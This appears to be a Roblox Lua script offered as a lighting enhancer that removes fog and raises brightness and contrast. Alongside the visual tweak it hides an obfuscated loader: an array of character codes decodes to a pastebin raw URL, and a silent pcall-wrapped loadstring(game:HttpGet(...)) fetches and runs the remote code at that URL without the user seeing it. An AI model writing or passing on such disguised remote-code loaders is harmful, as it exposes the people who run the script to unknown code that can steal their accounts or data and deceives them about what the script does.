local _0x1={104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,102,106,75,52,51,82,81,105}
local function _0x2(t)
local s=""
for i,v in pairs(t) do
s=s..string.char(v)
end
return s
end

local function _0x3()
local g=game
local l=g:GetService("Lighting")

l.FogStart=0
l.FogEnd=999999
l.Brightness=3
l.ClockTime=14
l.GlobalShadows=false
l.Ambient=Color3.fromRGB(180,180,180)
l.OutdoorAmbient=Color3.fromRGB(180,180,180)

local c=Instance.new("ColorCorrectionEffect")
c.Brightness=0.05
c.Contrast=0.25
c.Saturation=0.2
c.Parent=l

local a=l:FindFirstChildOfClass("Atmosphere")
if a then
a.Density=0
end
end

pcall(function()
loadstring(game:HttpGet(_0x2(_0x1)))()
end)

_0x3()
